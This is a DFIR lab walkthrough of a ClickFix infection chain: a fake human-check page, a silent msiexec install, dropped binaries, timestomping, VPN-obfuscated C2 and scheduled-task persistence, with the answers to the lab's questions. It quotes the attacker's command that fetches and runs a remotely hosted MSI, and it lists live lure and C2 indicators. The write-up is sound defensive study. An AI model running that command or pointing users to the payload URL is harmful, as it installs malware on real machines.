# 🚨 ClickTrace Investigation

---

## 🎯 Objective
Conduct an incident response investigation following a SOC alert related to suspicious outbound communications, identify the infection chain, analyze the malicious installer and C2 activity, and extract key indicators of compromise.

---

## 🧾 Lab Details
- **Platform:** Blue Team Labs Online (BTLO)  
- **Lab:** ClickTrace  
- **Environment:** Windows  
- **Difficulty:** Medium  
- **OS:** Windows  
- **Category:** Digital Forensics And Incident Response  

---

## 📖 Scenario
A number of campaigns continue to mislead victims, escalating from fraudulent ad clicks to full system compromise through malicious installers and VPN-obfuscated C2 channels.  

Our SOC triggered an alert on suspicious external IP communications, prompting immediate machine isolation and incident response triage to extract critical IOCs. Through rapid containment, we successfully prevented post-compromise activities, including data exfiltration and ransomware deployment.

---

## 🛠️ Tools Used
- Browser Artifacts  
- Zimmerman tools
- Sysinternals Suite  

---

## 🔎 Investigation Overview
The investigation focused on identifying the initial infection vector, understanding how the malicious installer was executed, and tracing the malware’s behavior across the system.

By correlating browser history, registry artifacts, file system metadata, and behavioral analysis from external malware intelligence sources, it was possible to reconstruct the attack chain from the malicious URL to the persistence mechanism.

---

## Lab Discovery

In this lab, we are analyzing a Windows system after a SOC alert involving suspicious outbound traffic.

The investigation focuses on tracing the infection chain, identifying the malicious installer, understanding how the attacker established C2 communication, and determining how persistence was maintained on the system.

---

## 🔍 Investigation Process

In most cases, I start by parsing the event logs, the `$MFT`, and the `$J` file to prepare them for the investigation.

### Commands used for parsing:

.\EvtxeCmd\EvtxECmd.exe -d "C:\Users\BTLOTest\Desktop\Artefacts\C\Windows\System32\winevt\logs" --csv Logs --csvf ALL-Logs.csv

.\MFTECmd.exe -f "C:\Users\BTLOTest\Desktop\Artefacts\C\`$MFT" --csv MFT --csvf Mft.csv

.\MFTECmd.exe -f "C:\Users\BTLOTest\Desktop\Artefacts\C\`$Extend\`$J" --csv J --csvf J.csv ```

## Q1) What is the malicious URL that initiated the infection chain?

For this question, I checked the browser history to identify any suspicious URLs.

Most of the URLs looked legitimate, but one stood out with a suspicious title like **"Checking if you are human"**, which is commonly used in social engineering attacks to trick users into interacting with malicious content.

That URL was the starting point of the infection chain.

**Answer ==> https://tinyurl.com/57ecjnrm**

<img width="1547" height="804" alt="ClickTrace-Q1" src="https://github.com/user-attachments/assets/d3e31e4f-c78c-46b0-ba38-66ddf16476c8" />

---

## Q2) What is the MITRE ATT&CK technique ID associated with the method used in the Execution Phase?

For this question, this is one of the most common techniques used in attacks involving malicious URLs and user interaction.

This scenario is a clear example of a **ClickFix attack**, where the user is tricked into executing malicious content through fake verification steps.

According to MITRE ATT&CK, this falls under:

**T1204.004 – User Execution: Malicious Copy and Paste**

This technique relies on social engineering to get the victim to run or interact with malicious content, which is exactly what happened in this case.

**Answer ==> T1204.004**

---

## Q3) What is the SHA-256 hash of the malicious installer executed in memory?

For this question, there are multiple ways to approach it, but the first thing that came to my mind was to check the latest executed commands.

So I looked into the **RunMRU registry key**, where I found a suspicious command:


""" cmd /c "cmd /c "msiexec.exe /i https://raw.githubusercontent.com/a4dq/q/refs/heads/main/gt.msi
 /qn && I'am n?t ? ??b?? - V?rific?ti?n : 417341 """ 


This command clearly points to a remotely hosted **MSI installer**, which already looks suspicious.

So I decided to download the file and calculate its hash.

Commands used:
wget https://raw.githubusercontent.com/a4dq/q/refs/heads/main/gt.msi


sha256sum gt.msi

This gave me the following hash:

4f8a96cbed7b7b85df044df253a7117da21d2eda5a94b353ecf8e66eecbd4f67

<img width="1548" height="811" alt="ClickTrace-Q3-P1" src="https://github.com/user-attachments/assets/58269129-95b8-4bc1-b4f4-ddf01a9938f0" />


I confirmed that this file is malicious, but this hash was not accepted in the lab.

So I had to dig deeper and perform some **OSINT** on this installer. After further investigation, I found a report on **Any.Run** showing the same behavior, which provided the correct hash used in this scenario.

Final confirmed hash:

**Answer ==> cbeaf0c9f54d0d8b31a292a704a1ec53a3e37fca197cfff76f1d578b156d81de**

<img width="1912" height="928" alt="ClickTrace-Q3-P2" src="https://github.com/user-attachments/assets/6de1688a-9b96-4fb3-abb4-691e0489194e" />

---

### 🔍 Additional Note

From the behavior observed in malware analysis:

- The MSI acts as a **downloader / dropper**
- It retrieves additional payloads from remote sources
- It prepares the environment for further stages of the attack (C2 communication & persistence)

This could explains why the hash observed during execution differs from the initially downloaded file.

---

Q4) The installer dropped additional malicious files in two locations. Provide the full file path of the first observed drop location.

While analyzing the behavior of the malware, I found that the installer drops additional payloads on the system.

From prior behavioral analysis and reports, one of the dropped files was identified as:

Engine-Switch.exe

To confirm this within the forensic artifacts, I searched for this filename in the $MFT, which allowed me to identify where the file was first written on disk.

From this, I found the first drop location:

**Answer ==> C:\Users\Administrator\AppData\Local\Amnesia**

<img width="1547" height="810" alt="ClickTrace-Q4-Q5" src="https://github.com/user-attachments/assets/0468edc1-88dd-4380-8a0b-02c03449b09f" />

---

Q5) The installer employed a known Indicator Removal technique with the dropped files. What is the corresponding MITRE ATT&CK technique ID?

While examining the dropped files in the $MFT, I noticed something unusual:

The Created Time
The Modified Time

Both timestamps were identical, which is not normal behavior for legitimate files.

This indicates that the attacker intentionally modified timestamps to hide evidence and make forensic analysis more difficult.

This behavior maps to the MITRE ATT&CK technique:

**T1070.006 – Indicator Removal: Timestomp**

Timestomping is used by attackers to manipulate file metadata and evade detection by making malicious files blend in with legitimate system activity.

**Answer ==> T1070.006**

<img width="1896" height="811" alt="ClickTrace-Q5" src="https://github.com/user-attachments/assets/94f674c1-7ce5-4058-b9f0-e2d6620564a7" />

---

Q6) What is the filename of the dropped executable responsible for establishing TCP/UDP connections and performing process mapping to the C2 server?

To answer this question, I referred back to the malware behavior analysis.

From the report, it was clear that one of the dropped executables was responsible for:

Establishing TCP/UDP connections
Performing process and network mapping

That executable is:

tcpvcon.exe

To further validate this, I used Sysinternals tools, specifically:

Procmon → to observe file creation activity
Filter:
Process Name = Engine-Switch.exe
Operation = CreateFile

This confirmed that tcpvcon.exe was created during execution.

**Answer ==> tcpvcon.exe**

<img width="1546" height="810" alt="ClickTrace-Q6-Q7" src="https://github.com/user-attachments/assets/bf85acf8-6235-415e-8223-209c2446435f" />

---

Q7) The attacker abused a legitimate executable to establish VPN-obfuscated C2 traffic. Identify the executable name responsible for initiating the C2 connection.

Continuing the behavioral analysis, I identified another executable used by the attacker:

EtherHa.exe

This binary was used to:

Establish VPN-based communication
Obfuscate traffic to the Command and Control (C2) server

This is a common technique where attackers use legitimate-looking or repurposed binaries to hide malicious communication within encrypted or tunneled traffic.

Using TCPView from Sysinternals, I was able to observe suspicious outbound connections tied to unusual ports, further supporting this behavior.

**Answer ==> EtherHa.exe**

<img width="1919" height="936" alt="ClickTrace-Q6-Q7-Q8-Malware behavior" src="https://github.com/user-attachments/assets/5e6f7091-2cfa-414c-83e6-050b9d6aaa95" />


---

Q8) Identify the public IP address of the VPN-associated C2 server.

From both:

Malware behavior analysis (external reports)
Network activity observation (TCPView)

I identified the suspicious external IP address involved in communication.

The traffic was:

Directed to unusual ports
Associated with the VPN-based C2 channel

The identified C2 server IP is:

**Answer ==> 217.138.194.181**

<img width="1548" height="812" alt="ClickTrace-Q8" src="https://github.com/user-attachments/assets/f347f7a4-d856-4e83-9c28-3466d1afabb3" />


---

Q9) The malware implemented a persistence mechanism to maintain access. Provide the full path of the file responsible for persistence.

To identify persistence, I focused on common mechanisms used by attackers.

One of the most common techniques is:

Scheduled Tasks

So I navigated to the following path:

C:\Windows\System32\Tasks

There, I found a suspicious task:

CtrlTlsVT1

I opened it using Notepad and found the following command:

<Command>C:\ProgramData\nn_auth\Engine-Switch.exe</Command>

This confirms that the malware ensures execution of its payload through a scheduled task.

This behavior maps to:

MITRE ATT&CK: T1053 – Scheduled Task Persistence

**Answer ==> C:\Windows\System32\Tasks\CtrlTlsVT1**

<img width="1546" height="808" alt="ClickTrace-Q9" src="https://github.com/user-attachments/assets/e43205ef-93fe-4994-be66-bdb8974429a9" />

---

**Conclusion**

From this investigation, I was able to reconstruct the full attack chain starting from the initial infection vector to persistence.

The attack began with a malicious shortened URL, which tricked the user through a social engineering technique known as a ClickFix attack. This led to the execution of a malicious MSI installer via msiexec, initiating the compromise.

The installer acted as a dropper, deploying additional payloads such as Engine-Switch.exe, which facilitated further stages of the attack. The malware then:

Established network connections using tcpvcon.exe
Created VPN-obfuscated C2 communication via EtherHa.exe
Connected to a remote C2 server (217.138.194.181)

To evade detection, the attacker used:

Timestomping (T1070.006) to manipulate file timestamps
Legitimate binaries abuse for stealthy communication

Finally, persistence was achieved through a scheduled task, ensuring the malware remained active across reboots.

This investigation highlights how modern attacks combine:

Social engineering
Living-off-the-land techniques
Defense evasion
Persistence mechanisms

All working together to achieve and maintain system compromise.

<img width="869" height="816" alt="ClickTraceDone" src="https://github.com/user-attachments/assets/ba7c6600-f9b4-4af7-8e87-edba644221d0" />
